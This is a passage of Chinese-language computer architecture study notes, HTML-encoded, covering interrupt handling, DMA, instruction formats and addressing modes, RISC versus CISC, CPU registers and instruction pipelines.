7;</p><p>6.&#x8BBE;&#x5907;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x89E6;&#x53D1;&#x5668;INTR&#x88AB;&#x7F6E;1&#xFF0C;&#x6807;&#x5FD7;&#x8BBE;&#x5907;&#x5411;CPU&#x63D0;&#x51FA;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x3002;&#x4E8E;&#x6B64;&#x540C;&#x65F6;&#xFF0C;INTR&#x88AB;&#x9001;&#x81F3;&#x6392;&#x961F;&#x5668;&#xFF0C;&#x8FDB;&#x884C;&#x4E2D;&#x65AD;&#x4F18;&#x5224;</p><p>7.&#x82E5;CPU&#x5141;&#x8BB8;&#x4E2D;&#x65AD;(EINT=1),&#x8BBE;&#x5907;&#x53C8;&#x88AB;&#x9009;&#x4E2D;&#x6392;&#x961F;&#xFF0C;&#x5373;&#x8FDB;&#x5165;&#x4E2D;&#x65AD;&#x54CD;&#x5E94;&#x9636;&#x6BB5;</p><p>8.&#x5411;&#x91CF;&#x5730;&#x5740;&#x9001;&#x81F3;PC&#xFF0C;&#x4F5C;&#x4E3A;&#x4E0B;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;</p><p>9.&#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x81F3;&#x8BBE;&#x5907;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x5165;&#x53E3;&#x5730;&#x5740;&#xFF0C;&#x8FDB;&#x5165;&#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x9636;&#x6BB5;</p><p>10.&#x6267;&#x884C;&#x7ED3;&#x675F;&#xFF0C;&#x4E2D;&#x65AD;&#x8FD4;&#x56DE;&#x81F3;&#x539F;&#x7A0B;&#x5E8F;&#x7684;&#x65AD;&#x70B9;&#x5904;</p><p>&#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x6D41;&#x7A0B;</p><p>&#x4FDD;&#x62A4;&#x73B0;&#x573A;</p><p>&#x4E2D;&#x65AD;&#x670D;&#x52A1;</p><p>&#x6062;&#x590D;&#x73B0;&#x573A;</p><p>&#x4E2D;&#x65AD;&#x8FD4;&#x56DE;</p><p>DMA&#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210;</p><p>DMA&#x63A5;&#x53E3;&#x5177;&#x6709;&#x7684;&#x529F;&#x80FD;</p><p>&#x5411;CPU&#x7533;&#x8BF7;DMA&#x4F20;&#x9001;</p><p>&#x5728;CPU&#x5141;&#x8BB8;DMA&#x5DE5;&#x4F5C;&#x65F6;&#xFF0C;&#x5904;&#x7406;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x6743;&#x7684;&#x8F6C;&#x4EA4;</p><p>&#x5728;DMA&#x671F;&#x95F4;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;&#xFF0C;&#x63A7;&#x5236;&#x6570;&#x636E;&#x4F20;&#x9001;</p><p>&#x786E;&#x5B9A;&#x6570;&#x636E;&#x4F20;&#x9001;&#x7684;&#x6C14;&#x52BF;&#x5730;&#x5740;&#x548C;&#x6570;&#x636E;&#x957F;&#x5EA6;&#xFF0C;&#x4FEE;&#x6B63;&#x6570;&#x636E;&#x4F20;&#x9001;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5730;&#x5740;&#x548C;&#x6570;&#x636E;&#x957F;&#x5EA6;</p><p>&#x5728;&#x6570;&#x636E;&#x5757;&#x4F20;&#x9001;&#x7ED3;&#x675F;&#x65F6;&#xFF0C;&#x7ED9;&#x51FA;DMA&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x7684;&#x4FE1;&#x53F7;</p><p>DMA&#x4E0E;&#x4E3B;&#x5B58;&#x4EA4;&#x6362;&#x6570;&#x636E;&#x7684;&#x4E09;&#x79CD;&#x65B9;&#x5F0F;</p><p>1.&#x505C;&#x6B62;CPU&#x8BBF;&#x95EE;&#x4E3B;&#x5B58;</p><p>2.&#x5468;&#x671F;&#x632A;&#x7528;</p><p>3.DMA&#x4E0E;CPU&#x4EA4;&#x66FF;&#x8BBF;&#x95EE;</p><p>DMA&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><p>DMA&#x7684;&#x5DE5;&#x4F5C;&#x8FC7;&#x7A0B;</p><p>&#x9884;&#x5904;&#x7406;&#x3001;&#x6570;&#x636E;&#x4F20;&#x9001;&#x3001;&#x540E;&#x5904;&#x7406;</p><p>DMA&#x65B9;&#x5F0F;&#x4E0E;&#x4E2D;&#x65AD;&#x7A0B;&#x5E8F;&#x7684;&#x6BD4;&#x8F83;</p><table><thead><tr><th></th><th>&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;</th><th>DMA&#x65B9;&#x5F0F;</th></tr></thead><tbody><tr><td>&#x6570;&#x636E;&#x4F20;&#x9001;</td><td>&#x7A0B;&#x5E8F;</td><td>&#x786C;&#x4EF6;</td></tr><tr><td>&#x54CD;&#x5E94;&#x65F6;&#x95F4;</td><td>&#x6307;&#x4EE4;&#x6267;&#x884C;&#x7ED3;&#x675F;</td><td>&#x5B58;&#x53D6;&#x5468;&#x671F;&#x7ED3;&#x675F;</td></tr><tr><td>&#x5904;&#x7406;&#x5F02;&#x5E38;&#x60C5;&#x51B5;</td><td>&#x80FD;</td><td>&#x4E0D;&#x80FD;</td></tr><tr><td>&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;</td><td>&#x4F20;&#x9001;&#x6570;&#x636E;</td><td>&#x540E;&#x5904;&#x7406;</td></tr><tr><td>&#x4F18;&#x5148;&#x7EA7;</td><td>&#x4F4E;</td><td>&#x9AD8;</td></tr></tbody></table><p>&#x4E03;  &#x6307;&#x4EE4;&#x7CFB;&#x7EDF;</p><p>&#x6307;&#x4EE4;&#x7684;&#x4E00;&#x822C;&#x683C;&#x5F0F;</p><p>| &#x64CD;&#x4F5C;&#x7801;&#x5B57;&#x6BB5; | &#x5730;&#x5740;&#x7801;&#x5B57;&#x6BB5; |</p><p>&#x64CD;&#x4F5C;&#x7801; &#x53CD;&#x6620;&#x673A;&#x5668;&#x505A;&#x4EC0;&#x4E48;&#x64CD;&#x4F5C;</p><p>1).&#x957F;&#x5EA6;&#x56FA;&#x5B9A;&#xFF1A;&#x7528;&#x4E8E;&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x8F83;&#x957F;&#x7684;&#x60C5;&#x51B5;&#xFF0C;RISC&#x3002;&#x5982;IBM 370 &#x64CD;&#x4F5C;&#x7801; 8&#x4F4D;</p><p>2).&#x957F;&#x5EA6;&#x53EF;&#x53D8;&#xFF1A;&#x64CD;&#x4F5C;&#x7801;&#x5206;&#x6563;&#x5728;&#x6307;&#x4EE4;&#x5B57;&#x6BB5;&#x7684;&#x4E0D;&#x540C;&#x5B57;&#x6BB5;&#x4E2D;&#x3002;</p><p>&#x6307;&#x4EE4;&#x5B57;&#x957F;</p><p>&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x51B3;&#x5B9A;&#x4E8E;&#x64CD;&#x4F5C;&#x7801;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x4E2A;&#x6570;</p><p>&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x56FA;&#x5B9A;&#x7684;&#x8BDD;=&#x5B58;&#x50A8;&#x5B57;&#x957F;</p><p>&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x53EF;&#x53D8;&#x7684;&#x8BDD;=&#xFF0C;&#x6309;&#x5B57;&#x8282;&#x7684;&#x500D;&#x6570;&#x53D8;&#x5316;</p><p>&#x64CD;&#x4F5C;&#x6570;&#x7C7B;&#x578B;&#x548C;&#x64CD;&#x4F5C;&#x79CD;&#x7C7B;</p><table><thead><tr><th>&#x7C7B;&#x578B;</th><th>&#x4EE3;&#x8868;</th></tr></thead><tbody><tr><td>&#x5730;&#x5740;</td><td>&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;</td></tr><tr><td>&#x6570;&#x5B57;</td><td>&#x5B9A;&#x70B9;&#x6570;&#x3001;&#x6D6E;&#x70B9;&#x6570;&#x3001;&#x5341;&#x8FDB;&#x5236;&#x6570;</td></tr><tr><td>&#x5B57;&#x7B26;</td><td>ASCII</td></tr><tr><td>&#x903B;&#x8F91;&#x6570;</td><td>&#x903B;&#x8F91;&#x8FD0;&#x7B97;</td></tr></tbody></table><p>&#x64CD;&#x4F5C;&#x7C7B;&#x578B;</p><table><thead><tr><th>&#x64CD;&#x4F5C;&#x7C7B;&#x578B;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x6570;&#x636E;&#x4F20;&#x9001;</td><td>&#x5BC4;&#x5B58;&#x5668;-&gt;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x5BC4;&#x5B58;&#x5668;-&gt;&#x5B58;&#x50A8;&#x5668;&#x7B49;</td></tr><tr><td>&#x7B97;&#x6570;&#x903B;&#x8F91;&#x8FD0;&#x7B97;</td><td>&#x52A0;&#x3001;&#x51CF;&#x3001;&#x4E58;&#x3001;&#x9664;&#x7B49;</td></tr><tr><td>&#x79FB;&#x4F4D;&#x64CD;&#x4F5C;</td><td>&#x7B97;&#x6570;&#x79FB;&#x4F4D;&#x3001;&#x903B;&#x8F91;&#x79FB;&#x4F4D;&#x3001;&#x5FAA;&#x73AF;&#x79FB;&#x4F4D;(&#x5E26;&#x8FDB;&#x4F4D;&#xFF0C;&#x4E0D;&#x5E26;&#x8FDB;&#x4F4D;)</td></tr><tr><td>&#x8F6C;&#x79FB;</td><td>&#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x79FB;(JMP)&#x3001;&#x6761;&#x4EF6;&#x8F6C;&#x79FB;{&#x7ED3;&#x679C;&#x4E3A;&#x96F6;&#x8F6C;(JZ)&#x3001;&#x7ED3;&#x679C;&#x6EA2;&#x51FA;&#x8F6C;(JO)&#x3001;&#x7ED3;&#x679C;&#x6709;&#x8FDB;&#x4F4D;&#x8F6C;(JC)&#x3001;&#x8DF3;&#x8FC7;&#x4E00;&#x6761;&#x6307;&#x4EE4;(SKP)}</td></tr><tr><td>&#x8C03;&#x7528;&#x548C;&#x8FD4;&#x56DE;</td><td></td></tr><tr><td>&#x9677;&#x9631;(Trap)&#x4E0E;&#x9677;&#x9631;&#x6307;&#x4EE4;</td><td>&#x610F;&#x5916;&#x4E8B;&#x6545;&#x7684;&#x4E2D;&#x65AD;</td></tr><tr><td>&#x8F93;&#x5165;&#x548C;&#x8F93;&#x51FA;</td><td>&#x7AEF;&#x53E3;&#x5730;&#x5740;-&gt;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;-&gt;&#x7AEF;&#x53E3;&#x5730;&#x5740;</td></tr></tbody></table><p>&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</p><table><thead><tr><th>&#x6307;&#x4EE4;&#x5BFB;&#x5740;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x987A;&#x5E8F;&#x5BFB;&#x5740;</td><td>&#x81EA;&#x52A8;&#x5F62;&#x6210;&#x4E0B;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;</td></tr><tr><td>&#x8DF3;&#x8DC3;&#x5BFB;&#x5740;</td><td>&#x901A;&#x8FC7;&#x8F6C;&#x79FB;&#x7C7B;&#x6307;&#x4EE4;&#x5B9E;&#x73B0;</td></tr></tbody></table><table><thead><tr><th>&#x6570;&#x636E;&#x5BFB;&#x5740;</th><th>&#x4F8B;&#x5B50;</th></tr></thead><tbody><tr><td>&#x7ACB;&#x5373;&#x5BFB;&#x5740;</td><td>op # A</td></tr><tr><td>&#x76F4;&#x63A5;&#x5BFB;&#x5740;</td><td>EA=A</td></tr><tr><td>&#x9690;&#x542B;&#x5BFB;&#x5740;</td><td>ACC x</td></tr><tr><td>&#x95F4;&#x63A5;&#x5BFB;&#x5740;</td><td>EA=(A)</td></tr><tr><td>&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;</td><td>EA=R</td></tr><tr><td>&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;</td><td>EA=(R)</td></tr><tr><td>&#x57FA;&#x5740;&#x5BFB;&#x5740;</td><td>EA=A+(BR)</td></tr><tr><td>&#x53D8;&#x5740;&#x5BFB;&#x5740;</td><td>EA=A+(IX)</td></tr><tr><td>&#x76F8;&#x5BF9;&#x5BFB;&#x5740;</td><td>EA=(PC)+A</td></tr><tr><td>&#x5806;&#x6808;&#x5BFB;&#x5740;</td><td>PUSH A</td></tr></tbody></table><p>&#x8BBE;&#x8BA1;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x5E94;&#x8003;&#x8651;&#x7684;&#x5404;&#x79CD;&#x56E0;&#x7D20;</p><table><thead><tr><th>&#x56E0;&#x7D20;</th><th>&#x8BE6;&#x7EC6;</th></tr></thead><tbody><tr><td>&#x64CD;&#x4F5C;&#x7C7B;&#x578B;</td><td>&#x5305;&#x62EC;&#x6307;&#x4EE4;&#x6570;&#x53CA;&#x64CD;&#x4F5C;&#x7684;&#x96BE;&#x6613;&#x7A0B;&#x5EA6;</td></tr><tr><td>&#x6570;&#x636E;&#x7C7B;&#x578B;</td><td>&#x786E;&#x5B9A;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x53C2;&#x4E0E;&#x64CD;&#x4F5C;</td></tr><tr><td>&#x6307;&#x4EE4;&#x683C;&#x5F0F;</td><td>&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x662F;&#x5426;&#x56FA;&#x5B9A;&#x3001;&#x64CD;&#x4F5C;&#x7801;&#x6570;&#x3001;&#x662F;&#x5426;&#x91C7;&#x7528;&#x6269;&#x5C55;&#x64CD;&#x4F5C;&#x7801;&#x6280;&#x672F;&#xFF0C;&#x5730;&#x5740;&#x7801;&#x4F4D;&#x6570;&#x3001;&#x5730;&#x5740;&#x4E2A;&#x6570;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x7C7B;&#x578B;</td></tr><tr><td>&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</td><td>&#x6307;&#x4EE4;&#x5BFB;&#x5740;&#x3001;&#x64CD;&#x4F5C;&#x6570;&#x5BFB;&#x5740;</td></tr><tr><td>&#x5BC4;&#x5B58;&#x5668;&#x4E2A;&#x6570;</td><td>&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x591A;&#x5C11;&#x76F4;&#x63A5;&#x5F71;&#x54CD;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x65F6;&#x95F4;</td></tr></tbody></table><p>RISC&#x6280;&#x672F;</p><p>RISC:&#x7CBE;&#x7B80;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x8BA1;&#x7B97;&#x673A;</p><p>CISC:&#x590D;&#x6742;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x8BA1;&#x7B97;&#x673A;</p><p>RISC&#x7684;&#x4E3B;&#x8981;&#x7279;&#x5F81;</p><p>&#x9009;&#x7528;&#x4F7F;&#x7528;&#x9891;&#x5EA6;&#x8F83;&#x9AD8;&#x7684;&#x4E00;&#x4E9B;&#x7B80;&#x5355;&#x6307;&#x4EE4;&#xFF0C;&#x590D;&#x6742;&#x6307;&#x4EE4;&#x7684;&#x529F;&#x80FD;&#x7531;&#x7B80;&#x5355;&#x6307;&#x4EE4;&#x6765;&#x7EC4;&#x5408;</p><p>&#x6307;&#x4EE4; &#x957F;&#x5EA6;&#x56FA;&#x5B9A;&#x3001;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x79CD;&#x7C7B;&#x5C11;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5C11;</p><p>&#x53EA;&#x6709; LOAD / STORE &#x6307;&#x4EE4;&#x8BBF;&#x5B58;</p><p>CPU &#x4E2D;&#x6709;&#x591A;&#x4E2A; &#x901A;&#x7528; &#x5BC4;&#x5B58;&#x5668;</p><p>&#x91C7;&#x7528; &#x6D41;&#x6C34;&#x6280;&#x672F; &#x4E00;&#x4E2A;&#x65F6;&#x949F;&#x5468;&#x671F; &#x5185;&#x5B8C;&#x6210;&#x4E00;&#x6761;&#x6307;&#x4EE4;</p><p>&#x91C7;&#x7528; &#x7EC4;&#x5408;&#x903B;&#x8F91; &#x5B9E;&#x73B0;&#x63A7;&#x5236;&#x5668;</p><p>&#x91C7;&#x7528; &#x4F18;&#x5316; &#x7684; &#x7F16;&#x8BD1; &#x7A0B;&#x5E8F;</p><p>RISC&#x548C;CISC&#x7684;&#x6BD4;&#x8F83;</p><p>RISC&#x66F4;&#x80FD; &#x5145;&#x5206;&#x5229;&#x7528; VLSI &#x82AF;&#x7247;&#x7684;&#x9762;&#x79EF;</p><p>RISC &#x66F4;&#x80FD; &#x63D0;&#x9AD8;&#x8BA1;&#x7B97;&#x673A;&#x8FD0;&#x7B97;&#x901F;&#x5EA6;(&#x6307;&#x4EE4;&#x6570;&#x3001;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5C11;,&#x901A;&#x7528; &#x5BC4;&#x5B58;&#x5668;&#x591A;&#xFF0C;&#x91C7;&#x7528;&#x7EC4;&#x5408;&#x903B;&#x8F91;&#xFF0C;&#x4FBF;&#x4E8E;&#x5B9E;&#x73B0;&#x6307;&#x4EE4;&#x6D41;&#x6C34;)</p><p>RISC &#x4FBF;&#x4E8E;&#x8BBE;&#x8BA1;&#xFF0C;&#x53EF; &#x964D;&#x4F4E;&#x6210;&#x672C;&#xFF0C;&#x63D0;&#x9AD8; &#x53EF;&#x9760;&#x6027;</p><p>RISC &#x6709;&#x5229;&#x4E8E;&#x7F16;&#x8BD1;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x4F18;&#x5316;</p><p>RISC &#x4E0D;&#x6613; &#x5B9E;&#x73B0; &#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x517C;&#x5BB9;</p><p>&#x516B;  CPU&#x7684;&#x7ED3;&#x6784;</p><p>CPU&#x7684;&#x529F;&#x80FD;</p><p>&#x63A7;&#x5236;&#x5668;&#x7684;&#x529F;&#x80FD;</p><p>&#x53D6;&#x6307;&#x4EE4;&#x3001;&#x5206;&#x6790;&#x6307;&#x4EE4;&#x3001;&#x6267;&#x884C;&#x6307;&#x4EE4;&#xFF0C;&#x53D1;&#x51FA;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x3001;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x8F93;&#x5165;&#x53CA;&#x7ED3;&#x679C;&#x7684;&#x8F93;&#x51FA;&#x3001;&#x603B;&#x7EBF;&#x7BA1;&#x7406;&#x3001;&#x5904;&#x7406;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x548C;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#xFF1B;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x6307;&#x4EE4;&#x63A7;&#x5236;&#x3001;&#x64CD;&#x4F5C;&#x63A7;&#x5236;&#x3001;&#x65F6;&#x95F4;&#x63A7;&#x5236;&#x3001;&#x5904;&#x7406;&#x4E2D;&#x65AD;&#x3001;&#x6570;&#x636E;&#x52A0;&#x5DE5;&#x3002;</p><p>&#x8FD0;&#x7B97;&#x5668;&#x7684;&#x529F;&#x80FD;</p><p>&#x5B9E;&#x73B0;&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x548C;&#x903B;&#x8F91;&#x9884;&#x7B97;</p><p>CPU&#x7684;&#x7ED3;&#x6784;</p><p>CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;</p><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x5BC4;&#x5B58;&#x5668;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>&#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x901A;&#x7528;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5B58;&#x653E;&#x64CD;&#x4F5C;&#x6570;&#xFF1A;&#x53EF;&#x505A;&#x67D0;&#x79CD;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x6240;&#x9700;&#x7684;&#x4E13;&#x7528;&#x5BC4;&#x5B58;&#x5668;</td></tr><tr><td>&#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5B58;&#x653E;&#x64CD;&#x4F5C;&#x6570;(&#x6EE1;&#x8DB3;&#x5404;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;)&#x4E24;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x62FC;&#x63A5;&#x5B58;&#x653E;&#x53CC;&#x500D;&#x5B57;&#x957F;&#x6570;&#x636E;</td></tr><tr><td>&#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5B58;&#x653E;&#x5730;&#x5740;&#xFF1A;&#x5176;&#x4F4D;&#x6570;&#x5E94;&#x6EE1;&#x8DB3;&#x6700;&#x5927;&#x7684;&#x5730;&#x5740;&#x8303;&#x56F4;&#x7528;&#x4E8E;&#x7279;&#x6B8A;&#x7684;&#x5BFB;&#x5740;&#x65B9;&#x5F0F; &#x6BB5;&#x57FA;&#x503C; &#x6808;&#x6307;&#x9488;</td></tr><tr><td>&#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x6761;&#x4EF6;&#x7801;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5B58;&#x653E;&#x6761;&#x4EF6;&#x7801;&#xFF1A;&#x53EF;&#x4F5C;&#x7A0B;&#x5E8F;&#x5206;&#x652F;&#x7684;&#x4F9D;&#x636E;&#x5982; &#x6B63;&#x3001;&#x8D1F;&#x3001;&#x96F6;&#x3001;&#x6EA2;&#x51FA;&#x3001;&#x8FDB;&#x4F4D;&#x7B49;</td></tr><tr><td>&#x63A7;&#x5236;&#x548C;&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x63A7;&#x5236;&#x5BC4;&#x5B58;&#x5668;</td><td>PC-&gt;MAR-&gt;M-&gt;MDR-&gt;IR&#xFF0C;&#x63A7;&#x5236;CPU</td></tr><tr><td>&#x63A7;&#x5236;&#x548C;&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;(&#x5B58;&#x653E;&#x6761;&#x4EF6;&#x7801;),PSW&#x5BC4;&#x5B58;&#x5668;(&#x5B58;&#x653E;&#x5B50;&#x7A0B;&#x5E8F;&#x72B6;&#x6001;&#x5B57;)</td></tr></tbody></table><p>&#x6307;&#x4EE4;&#x5468;&#x671F;</p><p>&#x53D6;&#x51FA;&#x5E76;&#x6267;&#x884C;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x6240;&#x9700;&#x7684;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x3002;&#x5206;&#x4E3A;&#x53D6;&#x503C;&#x5468;&#x671F;&#x548C;&#x6267;&#x884C;&#x5468;&#x671F;</p><p>&#x6307;&#x4EE4;&#x5468;&#x671F;&#x7684;&#x6570;&#x636E;&#x6D41;</p><p>&#x53D6;&#x503C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;</p><p>&#x95F4;&#x5740;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;</p><p>&#x6267;&#x884C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;&#x2013;&#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;&#x4E0D;&#x540C;</p><p>&#x4E2D;&#x65AD;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;</p><p>&#x5F71;&#x54CD;&#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x7EBF;&#x6027;&#x80FD;&#x7684;&#x56E0;&#x7D20;</p><table><thead><tr><th>&#x56E0;&#x7D20;</th><th>&#x89E3;&#x91CA;</th><th>&#x89E3;&#x51B3;</th></tr></thead><tbody><tr><td>&#x7ED3;&#x6784;&#x76F8;&#x5173;</td><td>&#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x4E89;&#x7528;&#x540C;&#x4E00;&#x529F;&#x80FD;&#x90E8;&#x4EF6;&#x4EA7;&#x751F;&#x8D44;&#x6E90;&#x51B2;&#x7A81;&#x4F7F;&#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x51FA;&#x73B0;&#x505C;&#x987F;&#xFF0C;&#x5F71;&#x54CD;&#x6D41;&#x6C34;&#x7EBF;&#x6548;&#x7387;</td><td>&#x505C;&#x987F;&#x3001;&#x6307;&#x4EE4;&#x5B58;&#x50A8;&#x5668;&#x548C;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5668;&#x5206;&#x5F00;&#x3001;&#x6307;&#x4EE4;&#x9884;&#x53D6;&#x6280;&#x672F;</td></tr><tr><td>&#x6570;&#x636E;&#x76F8;&#x5173;</td><td>&#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x56E0;&#x91CD;&#x53E0;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x80FD;&#x6539;&#x53D8;&#x64CD;&#x4F5C;&#x6570;&#x7684; &#x8BFB;/&#x5199; &#x8BBF;&#x95EE;&#x987A;&#x5E8F;</td><td>&#x540E;&#x63A8;&#x6CD5;&#x3001;&#x91C7;&#x7528;&#x65C1;&#x8DEF;&#x6280;&#x672F;</td></tr><tr><td>&#x63A7;&#x5236;&#x76F8;&#x5173;</td><td>&#x7531;&#x8F6C;&#x79FB;&#x6307;&#x4EE4;&#x5F15;&#x8D77;</td><td>&#x4ECA;&#x65E9;&#x5224;&#x522B;&#x8F6C;&#x79FB;&#x662F;&#x5426;&#x53D1;&#x751F;&#x3001;&#x53CA;&#x65E9;&#x751F;&#x6210;&#x8F6C;&#x79FB;&#x76EE;&#x6807;&#x5730;&#x5740;&#x3001;&#x9884;&#x53D6;&#x8F6C;&#x79FB;&#x6210;&#x529F;&#x6216;&#x4E0D;&#x6210;&#x529F;&#x4E24;&#x4E2A;&#x63A7;&#x5236;&#x6D41;&#x65B9;&#x5411;&#x4E0A;&#x7684;&#x76EE;&#x6807;&#x6307;&#x4EE4;&#x3001;&#x52A0;&#x5FEB;&#x548C;&#x63D0;&#x524D;&#x5F62;&#x6210;&#x6761;&#x4EF6;&#x7801;&#x7B49;</td></tr></tbody></table><p>&#x6D41;&#x6C34;&#x7EBF;&#x6027;&#x80FD;</p><table><thead><tr><th>&#x6307;&#x6807;</th><th>&#x6027;&#x80FD;</th></tr></thead><tbody><tr><td>&#x541E;&#x5410;&#x7387;</td><td>&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185; &#x6D41;&#x6C34;&#x7EBF;&#x6240;&#x5B8C;&#x6210;&#x6307;&#x4EE4; &#x6216;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x7684;&#x6570;&#x91CF;</td></tr><tr><td>&#x52A0;&#x901F;&#x6BD4;</td><td>m &#x6BB5;&#x7684;&#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x901F;&#x5EA6;&#x4E0E;&#x7B49;&#x529F;&#x80FD;&#x7684;&#x975E;&#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x901F;&#x5EA6;&#x4E4B;&#x6BD4;</td></tr><tr><td>&#x6548;&#x7387;</td><td>&#x6D41;&#x6C34;&#x7EBF;&#x4E2D;&#x5404;&#x529F;&#x80FD;&#x6BB5;&#x7684; &#x5229;&#x7528;&#x7387;</td></tr></tbody></table><p>&#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x591A;&#x53D1;&#x6280;&#x672F;</p><p>&#x8D85;&#x6807;&#x91CF;&#x6280;&#x672F;&#x3001;&#x8D85;&#x6D41;&#x6C34;&#x7EBF;&#x6280;&#x672F;&#x3001;&#x8D85;&#x957F;&#x6307;&#x4EE4;&#x5B57;&#x6280;&#x672F;</p><p>&#x6D41;&#x6C34;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x8FD0;&#x7B97;&#x6D41;&#x6C34;&#x7EBF;</p><p>&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;</p><p>&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x6807;&#x8BB0;&#x3001;&#x4E2D;&#x65AD;&#x5224;&#x4F18;&#x903B;&#x8F91;&#x3001;&#xFF08;&#x786C;&#x4EF6;&#x6392;&#x961F;&#x3001;&#x8F6F;&#x4EF6;&#x6392;&#x961F;&#xFF09;</p><p>&#x4E2D;&#x65AD;&#x54CD;&#x5E94;</p><p>&#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6;&#xFF1A;&#x5141;&#x8BB8;&#x4E2